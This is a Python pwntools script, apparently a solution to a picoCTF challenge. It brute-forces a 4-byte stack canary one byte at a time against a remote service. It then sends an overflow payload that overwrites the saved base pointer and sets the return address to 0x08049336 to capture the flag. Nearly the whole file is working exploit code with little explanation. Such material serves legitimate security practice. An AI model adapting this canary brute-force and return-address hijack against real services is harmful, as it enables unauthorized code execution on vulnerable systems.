from pwn import *
from pwnlib.tubes import process
from itertools import product, islice

CANARY_SIZE = 4
MAX_ASCII = 255


def brute_force_canary():
    """
    It's known that the canary is 4 bytes long, so we'll brute force each byte separately instead of a normal brute
    force. We loop over the canary size, and the over all possible ASCII's.
    :return:
    """

    canary = str()
    for byte_index in range(CANARY_SIZE):
        for curr_char in range(MAX_ASCII):
            curr_canary = canary + chr(curr_char)
            if check_canary(curr_canary):
                canary = curr_canary
                break
    return canary


base_exploit_str = "1" * 64  # Overwrite 64 bytes of local vars before canary


def check_canary(canary: str, guess_canary: bool = True):
    # Connect to pico using netcat
    conn = connect("saturn.picoctf.net", 50553)

    # Overwrite local vars + canary
    input_str = base_exploit_str + canary
    if not guess_canary:
        # Overwrite additional local vars
        input_str += "2" * 12
        # Overwrite old BP
        input_str += "3" * 4
        # Overwrite return address
        input_str = input_str.encode() + p32(0x08049336)

    log.debug("PROGRAM:")
    print(conn.recv().decode())

    # Send length and exploit string
    conn.sendline(str(len(input_str)).encode())
    print(len(input_str))
    conn.recv()
    print("Curr canary: {}\n".format(canary))
    conn.sendline(input_str)

    # Get responses from program
    resp = conn.recv().decode()
    resp2 = str()

    if guess_canary:
        resp2 = conn.recv().decode()    # To get flag if we're not guessing the canary anymore
    conn.close()

    if "Smashing" in resp:
        log.info("FAIL")
        return False
    else:
        log.info("************ SUCCESS *************")

        print(resp)
        print(resp2)
        return True


def main():
    correct_canary = brute_force_canary()
    # correct_canary = "BiRd"
    check_canary(correct_canary, False)


if __name__ == '__main__':
    main()
